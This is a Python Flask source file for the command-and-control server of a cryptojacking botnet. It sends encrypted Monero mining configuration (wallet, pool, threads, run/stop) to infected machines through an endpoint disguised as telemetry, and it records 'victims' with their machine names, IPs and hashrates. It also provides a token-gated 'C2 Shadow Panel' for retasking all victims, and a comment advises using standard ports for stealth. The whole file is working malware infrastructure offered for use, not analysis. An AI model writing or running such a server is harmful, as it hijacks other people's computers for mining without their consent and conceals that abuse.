from flask import Flask, jsonify, request, render_template_string, abort, redirect, url_for
import os
import base64
import json
from cryptography.hazmat.primitives.ciphers.aead import AESGCM

app = Flask(__name__)

# --- CONFIGURATION SADIQUE ---
# 32-byte key for AES encryption. MUST match the loader!
SECRET_KEY = bytes.fromhex('211fc9cb70f14ccaa39a1b9628afee5ce5a367767215859f59807b65cae8555d')
ADMIN_TOKEN = "77abfab1401fe7306b5e06724d84a36c0974f7efc27b28cc67300e48a471711e"

config_data = {
    "wallet": "44AFFq5k9W9X8fHjE6T5kZpL8N3mR2vQ1sY7xV4bC9aM0nB1vX3zQ5wE8rT2yU6iO4pA7sD9fG1hJ3kL5zX8c",
    "pool": "pool.supportxmr.com:443",
    "threads": 2,
    "status": "run"
}

victims = []

def encrypt_payload(data):
    """Encrypts data for transport using AES-GCM."""
    aesgcm = AESGCM(SECRET_KEY)
    nonce = os.urandom(12)
    ct = aesgcm.encrypt(nonce, data.encode(), None)
    return base64.b64encode(nonce + ct).decode()

def decrypt_payload(token):
    """Decrypts data received from victims."""
    try:
        raw = base64.b64decode(token)
        nonce, ct = raw[:12], raw[12:]
        aesgcm = AESGCM(SECRET_KEY)
        return aesgcm.decrypt(nonce, ct, None).decode()
    except Exception:
        return None

@app.route('/')
def index():
    return "System Online", 200

@app.route('/api/v1/telemetry', methods=['GET'])
def get_config():
    """Send encrypted config to the miner."""
    encrypted_conf = encrypt_payload(json.dumps(config_data))
    return jsonify({"data": encrypted_conf})

@app.route('/api/v1/update', methods=['POST'])
def checkin():
    """Handle heartbeat and telemetry from infected machines."""
    encrypted_data = request.json.get('payload')
    decrypted_json = decrypt_payload(encrypted_data)
    if not decrypted_json:
        abort(403)
    try:
        data = json.loads(decrypted_json)
    except:
        abort(400)

    existing_victim = next((v for v in victims if v['machine_name'] == data['machine_name']), None)
    if existing_victim:
        existing_victim.update(data)
    else:
        victims.append(data)

    return jsonify({"status": "ok", "cmd": encrypt_payload(config_data["status"])})

@app.route('/admin/control_panel', methods=['GET'])
def dashboard():
    token = request.args.get('token')
    if token != ADMIN_TOKEN:
        return "Accès Refusé", 403
    
    html_template = """
    <!DOCTYPE html>
    <html lang="en">
    <head>
        <meta charset="UTF-8">
        <title>C2 Shadow Panel</title>
        <style>
            body { font-family: 'Courier New', monospace; background: #050505; color: #0f0; padding: 20px; }
            .container { max-width: 1000px; margin: 0 auto; }
            h1 { text-align: center; text-shadow: 2px 2px #f00; }
            .config-section { background: #111; border: 1px solid #0f0; padding: 20px; margin-bottom: 30px; }
            .config-section h2 { margin-top: 0; border-bottom: 1px solid #0f0; padding-bottom: 10px; }
            .form-group { margin-bottom: 15px; }
            label { display: block; margin-bottom: 5px; color: #0f0; }
            input, select { width: 100%; padding: 8px; background: #000; border: 1px solid #0f0; color: #0f0; box-sizing: border-box; }
            button { background: #0f0; color: #000; border: none; padding: 10px 20px; cursor: pointer; font-weight: bold; margin-top: 10px; }
            button:hover { background: #0c0; }
            table { width: 100%; border-collapse: collapse; margin-top: 20px; }
            th, td { border: 1px solid #0f0; padding: 12px; text-align: left; }
            th { background: #002200; color: #0f0; text-transform: uppercase; }
            tr:hover { background: #004400; }
            .status-run { color: #0f0; font-weight: bold; }
            .status-kill { color: #f00; font-weight: bold; }
        </style>
    </head>
    <body>
        <div class="container">
            <h1>💀 C2 SHADOW PANEL 💀</h1>
            <div class="config-section">
                <h2>Update Global Configuration</h2>
                <form action="/admin/update_config" method="POST">
                    <input type="hidden" name="token" value="{{ token }}">
                    <div class="form-group">
                        <label>Monero Wallet Address</label>
                        <input type="text" name="wallet" value="{{ config.wallet }}">
                    </div>
                    <div class="form-group">
                        <label>Mining Pool</label>
                        <input type="text" name="pool" value="{{ config.pool }}">
                    </div>
                    <div class="form-group">
                        <label>Threads</label>
                        <input type="number" name="threads" value="{{ config.threads }}">
                    </div>
                    <div class="form-group">
                        <label>Status</label>
                        <select name="status">
                            <option value="run" {% if config.status == 'run' %}selected{% endif %}>RUN</option>
                            <option value="stop" {% if config.status == 'stop' %}selected{% endif %}>STOP</option>
                        </select>
                    </div>
                    <button type="submit">Apply Changes</button>
                </form>
            </div>
            <div class="victim-section">
                <h2>Active Victims</h2>
                <table>
                    <tr><th>Machine Name</th><th>CPU %</th><th>Hashrate</th><th>OS</th><th>IP</th></tr>
                    {% for v in victims %}
                    <tr>
                        <td>{{v.machine_name}}</td><td>{{v.cpu_usage}}%</td><td>{{v.hashrate}} H/s</td><td>{{v.os}}</td><td>{{v.ip}}</td>
                    </tr>
                    {% endfor %}
                </table>
            </div>
        </div>
    </body>
    </html>
    """
    return render_template_string(html_template, config=config_data, victims=victims, token=token)

@app.route('/admin/update_config', methods=['POST'])
def update_config():
    """Update the global config for all victims."""
    token = request.form.get('token')
    if token != ADMIN_TOKEN:
        return "Accès Refusé", 403
    
    config_data['wallet'] = request.form.get('wallet')
    config_data['pool'] = request.form.get('pool')
    config_data['threads'] = int(request.form.get('threads', 2))
    config_data['status'] = request.form.get('status')
    
    return redirect(url_for('dashboard', token=token))

if __name__ == "__main__":
    # Run on port 80 or 443 in production for stealth, here we use 5000 for testing.
    app.run(host='0.0.0.0', port=5000)
